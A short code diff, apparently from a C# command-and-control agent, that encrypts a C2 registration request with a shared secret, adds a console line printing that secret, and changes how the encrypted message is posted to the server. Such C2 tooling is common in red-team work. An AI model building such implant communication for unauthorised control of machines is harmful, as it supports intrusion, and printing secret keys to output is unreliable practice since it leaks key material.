@@ -87,10 +87,11 @@ var registerRequest = new C2Request
 };
 
 var encryptedRegisterRequestMessage = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(registerRequest), JsonSerializer.Serialize(sharedSecret));
+Console.WriteLine("Secret: " + JsonSerializer.Serialize(sharedSecret));
 Console.WriteLine(encryptedRegisterRequestMessage);
 
 // Init contact request
-var registrationResult = await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(encryptedRegisterRequestMessage));
+var registrationResult = await baseCommunicationService.SimplePostAsync("/", encryptedRegisterRequestMessage);
 
 if (registrationResult is null)
 {
